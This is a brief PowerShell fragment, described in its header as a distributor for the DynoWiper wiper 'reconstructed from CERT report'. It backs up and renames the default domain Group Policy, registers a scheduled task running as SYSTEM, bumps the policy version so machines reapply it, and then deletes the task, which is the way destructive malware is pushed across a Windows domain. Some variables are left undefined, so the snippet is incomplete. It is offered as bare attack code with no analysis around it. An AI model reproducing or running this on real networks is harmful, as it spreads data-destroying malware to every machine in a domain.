# DynoWiper GPO distributor (reconstructed from CERT report)
$backup = Backup-GPO -Name "Default Domain Policy" -Path $tmp
Rename-GPO -Guid $g -TargetName "Custom Domain Policy"
$filter = "79A87EBB-4DF6-4541-9530-CAD8BEE8A7AD"
Register-ScheduledTask -TaskName "Custom GPO Task" -User "NT AUTHORITY\SYSTEM" -RunLevel Highest
Set-ItemProperty $gpt -Name MachineVersionNumber -Value 262148
schtasks.exe /delete /TN "Custom GPO Task" /F
